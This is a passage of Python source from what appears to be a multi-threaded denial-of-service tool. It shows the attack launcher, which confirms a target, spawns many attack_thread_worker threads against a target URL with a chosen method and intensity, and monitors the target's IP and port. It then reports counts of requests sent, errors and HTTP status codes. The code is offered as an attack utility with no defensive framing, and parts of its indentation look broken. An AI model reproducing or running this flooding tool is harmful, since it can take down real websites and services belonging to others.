      print(f"{Fore.RED}Intensity: {Fore.CYAN}{attack_intensity.capitalize()}{Fore.YELLOW}, Strategy: {Fore.CYAN}{attack_strategy.capitalize()}{Fore.YELLOW}, Threads: {Fore.MAGENTA}{threads_count}{Fore.YELLOW}, Method: {Fore.GREEN}{attack_type}{Fore.YELLOW}")
      if input(f"{Fore.CYAN}Confirm to start? (Y/n): {Fore.RESET}").lower() == 'n':
        print(f"{Fore.YELLOW}Attack cancelled.")
        exit()

    print(f"{Fore.GREEN}Starting attack... Press Ctrl+C to stop.{Fore.RESET}")
    monitor = threading.Thread(target=monitor_thread_worker, args=(target_details['ip'], target_details['port']), daemon=True)
    monitor.start()
    threads = []

    attack_start_time_main = time.time()
    for i in range(threads_count):
      if stop_event.is_set():
        break
      thread = threading.Thread(target=attack_thread_worker, args=(target_url, attack_type, target_details), daemon=True)
      threads.append(thread)
      thread.start()
      if i > 0 and i % 50 == 0 and i < threads_count -1:
        time.sleep(0.05)

    try:
      while not stop_event.is_set():
        if threads_count > 0 and not any(t.is_alive() for t in threads) and stats["sent"] < threads_count:
          if time.time() - attack_start_time_main > 5:
            print(f"\n{Fore.RED}[WARN] All worker threads stopped prematurely. Check for widespread errors or target issues.")
            stop_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
      print(f"\n{Fore.YELLOW}[INFO] KeyboardInterrupt. Stopping...")
      stop_event.set()
    print(f"\n{Fore.YELLOW}[INFO] Waiting for threads to finish (max 5s)...")
    if monitor.is_alive():
      monitor.join(timeout=2.0)
      for t in threads:
        if t.is_alive():
          t.join(timeout=0.1)
          time.sleep(0.1)
          cleargui()
          print(XBanner)
          print(f"{Fore.GREEN}Attack Finished/Stopped: {target_url}{Fore.RESET}")
    with lock:
      total_sent = stats["sent"]
      total_errors = sum(stats["errors"].values())
      print(f"{Fore.CYAN}Total Sent: {Fore.GREEN}{total_sent}")
      print(f"{Fore.CYAN}Total Errors: {Fore.RED}{total_errors}")
      if total_errors > 0:
        print(f"{Fore.RED}Error Breakdown:")
        for k_error, v_error in stats["errors"].items():
          if v_error > 0:
            print(f"  - {k_error}: {v_error}")
            print(f"{Fore.CYAN}Status Code Breakdown:")
            if stats["status_codes"]:
              for code, count in sorted(stats["status_codes"].items()):
                print(f"  - HTTP {code}: {count}")
            else:
              print("  - No status codes recorded.")
              print(f"{Fore.YELLOW}Exiting.")
